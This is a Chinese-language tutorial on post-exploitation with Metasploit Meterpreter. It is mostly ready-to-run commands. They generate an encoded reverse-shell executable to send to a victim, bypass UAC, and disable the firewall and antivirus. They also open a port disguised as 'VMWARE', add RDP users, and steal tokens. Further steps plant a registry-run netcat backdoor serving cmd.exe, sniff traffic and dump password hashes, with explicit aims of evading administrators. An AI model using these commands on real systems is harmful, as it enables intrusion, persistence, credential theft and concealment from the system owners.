# 内网渗透之如何玩转Meterpreter？

随着windows系统的不断更新完善，windows对用户系统的安全力度也在加强。这对我们的渗透，也带来了不少的麻烦。今天我将带大家，利用目前流行的 metasploit 框架，绕过一些 UAC 及防火墙的限制，从而达到成功利用的目的！

由于绕过 UAC 的功能需在 meterpreter 的shell 才能实现。因此，我们首先要做的就是取得目标机器的 meterpreter shell 。

生成一个 payload ：

**msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.15.131 lport=4444 -f exe -o /root/virus.exe -e x86/shikata\_ga\_nai -i 8**

![](../Images/6be8c52239e574639acfe1555b455469.png)

将以上生成的 payload 发送给目标机器并让其执行!

接着，我们在 kali 上配置一个反弹会话处理程序：

**use exploit/multi/handler**

**set payload windows/meterpreter/reverse\_tcp**

**set LHOST 192.168.15.131**

**set LPORT 4444**

**exploit**

![](../Images/7ad9ccb75c29cfebe393ba323d4a57d1.png)

当目标机器成功执行payload后我们就取得了一个 meterpreter shell 。

![](../Images/150aa6d9f0d80e11a3c7025de35ca101.png)

我们尝试直接利用 getuid 和 getsystem 命令来提权：

![](../Images/0d2e45db44cba8e6bccf3a5c95b20e7b.png)

从以上结果我们基本可以判定遭到了 UAC 的用户访问控制的拦截！既然这样，那么我们来利用 meterpreter 的强大功能来进行绕过！

**use exploit/windows/local/ask**

**show options**

**set session 1**

**exploit**

![](../Images/1b12586172686a8c31143c87d576227d.png)

当我们成功执行以上命令后，我们会在目标系统上弹出一个确认框只要点击确认即可成功绕过！现在我们再来通过 getuid 和 getsystem 命令来查看当前我们的 shell 权限：

![](../Images/477319de9ef779dc780321fe9092ac8b.png)

现在我们来通过其 shell 来关闭防火墙：

**shell**

**netsh adcfirewall set allprofiles state off**

![](../Images/c5e33c2e4aff387b300ba7430bdc55d7.png)

我们打开防火墙配置查看防火墙已成功被我们关闭!

![](../Images/a819d87dd10974634d59d1b7be4e2721.png)

但是我们可以看出，如果目标管理员查看防火墙配置，发现防火墙被人为关闭，那么必定引起管理员的警惕！因此，我们还可以通过策略的添加，来隐蔽我们的行为。

**netsh firewall add portopening TCP 444 "VMWARE" ENABLE ALL**

伪装成一个系统正常的进程，之后远程重启目标系统，并利用 NC 连接即可！

开启3389远程桌面：

**run post/windows/manage/enable\_rdp**

![](../Images/55e2d34ee9f1a8c6bc00f094fb5d090f.png)

还可以使用** run getgui -e** 来开启远程桌面：

![](../Images/915b3ebf85c817017d17758b59943319.png)

利用该命令，我们还可以在目标机器上添加用户：

**run getgui -u xxxxx -p xxxxx**

我们还可以尝试关闭目标机器上的杀毒软件：

**run killav**

![](../Images/2c3b92d758ba29ac42f553f624e55851.png)对目标系统桌面进行实时截图：

**screenshot**

**use espia**

![](../Images/305018cc9f2c5fb9af48a877b63c4d57.png)

窃取及伪造域账户 token ：

**load incognito**

**list\_tokens -u**

**impersonate\_token xxxxx\\\\xxxxxxx**

**execute -f cmd.exe -i -t**

  

![](../Images/34c6ac7e6173c7091bd5446a7da8937a.png)

  

利用注册表添加 NC 后门：

上传 NC 到目标系统：

**upload /usr/share/windows-binaries/nc.exe C:\\\\windows\\\\system32**

枚举注册表内容（开机启动）

**reg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run**

在该注册表增加内容（开机启动）

**reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v nc -d "C:\\windows\\system32\\nc.exe -Ldp 444 -e cmd.exe"**

查看内容是否增加成功：

**reg queryval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\Run -v nc**

![](../Images/3d2048ff6cd5b21941b6088356bdf6ea.png)

对目标网络实施嗅探抓包：

加载 sniffer 插件：

**load sniffer**

![](../Images/91c9b2e531edd9bb2fc80de6b6026339.png)对指定网卡进行抓包嗅探:

**sniffer\_start 9**

![](../Images/11752042473a76cfe0c4e88669014f09.png)

将抓取的包保存为cap文件：

**sniffer\_dump 9 1.cap**

![](../Images/caa4f467c725e9cbc03336d86a5406db.png)

对抓取的包进行解包：

**use auxiliary/sniffer/psnuffle**

**set pcapfile 1.cap**

**run**

![](../Images/26f621842dae2db498484c600b7e1db2.png)

获取目标系统上的 hash 值：

**use post/windows/gather/hashdump**

**set session 4**

**run**

![](../Images/794da710771915bb6b53521db0a9bc6a.png)
